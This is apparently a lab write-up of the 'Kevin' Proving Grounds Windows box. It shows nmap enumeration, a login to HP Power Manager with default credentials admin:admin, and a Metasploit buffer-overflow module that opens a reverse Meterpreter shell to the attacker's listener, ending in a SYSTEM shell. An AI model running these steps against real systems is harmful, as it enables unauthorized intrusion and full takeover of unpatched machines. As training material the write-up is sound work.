---
machine: Kevin
platform: Proving Grounds
category: Windows
difficulty: Easy
tags: [default-credentials, hp-power-manager, buffer-overflow, metasploit]
date: 2026-07-17
status: retired
summary: A legacy Windows 7 box running a UPS management webapp — testing default-credential login and a known buffer-overflow exploit against the management software for a direct SYSTEM shell via Metasploit.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/pg/kevin]
└─$ cat portscan
# Nmap 7.99 scan initiated Fri Jul 17 13:45:40 2026 as: /usr/lib/nmap/nmap -p- -T4 -oN portscan target
Nmap scan report for target (192.168.246.45)
Host is up (0.032s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

# Nmap done at Fri Jul 17 13:46:30 2026 -- 1 IP address (1 host up) scanned in 50.44 seconds
```

```bash
──(kali㉿kali)-[192.168.45.225]-[~/pg/kevin]
└─$ cat fingerprint
# Nmap 7.99 scan initiated Fri Jul 17 13:47:04 2026 as: /usr/lib/nmap/nmap -p 80,135,139,445,3389,3573 -sCV -T4 -oN fingerprint target
Nmap scan report for target (192.168.246.45)
Host is up (0.032s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-07-16T17:44:11
|_Not valid after:  2027-01-15T17:44:11
|_ssl-date: 2026-07-17T17:48:38+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-07-17T17:47:42+00:00
3573/tcp open  tag-ups-1?
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-17T17:47:42
|_  start_date: 2026-07-17T17:45:06
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:e7:f2 (VMware)
|_clock-skew: mean: 1h24m02s, deviation: 3h07m50s, median: 1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-17T10:47:42-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 17 13:48:36 2026 -- 1 IP address (1 host up) scanned in 92.36 seconds
```

When we go to the website we see it is running HP Power Manager.

We can lookup the default creds and gain acess with `admin:admin`

Upon investigating the box we don't find anything that seems particularly helpful for gaining system RCE, so we lookup HP Power Manager CVEs and are presented with a couple RCE options, both being buffer overflows.

## Foothold

For the sake of simplicity I use [[Metasploit]] to attempt these exploits against the box, the first one fails and the second one succeeds.

We gain a revshell as SYSTEM where we can retrieve the Administrator's flag.

```bash
msf exploit(windows/http/hp_power_manager_login) > search hp power manager

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/hp_power_manager_filename       2011-10-19       normal     No     HP Power Manager 'formExportDataLogs' Buffer Overflow
   1  exploit/windows/http/hpe_sim_76_amf_deserialization  2020-12-15       excellent  Yes    HPE Systems Insight Manager AMF Deserialization RCE
   2    \_ target: Windows Command                         .                .          .      .
   3    \_ target: Windows Powershell                      .                .          .      .
   4  exploit/windows/http/hp_power_manager_login          2009-11-04       average    No     Hewlett-Packard Power Manager Administration Buffer Overflow


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/hp_power_manager_login

msf exploit(windows/http/hp_power_manager_login) > use 0

msf exploit(windows/http/hp_power_manager_filename) > set rhost 192.168.246.45
rhost => 192.168.246.45
msf exploit(windows/http/hp_power_manager_filename) > set lhost 192.168.45.225
lhost => 192.168.45.225
msf exploit(windows/http/hp_power_manager_filename) > run
[*] Started reverse TCP handler on 192.168.45.225:4444 
[*] Generating payload...
[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
[*] Sending stage (199238 bytes) to 192.168.246.45
[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)
[*] Meterpreter session 1 opened (192.168.45.225:4444 -> 192.168.246.45:49193) at 2026-07-17 14:00:05 -0400

meterpreter > shell
Process 3108 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
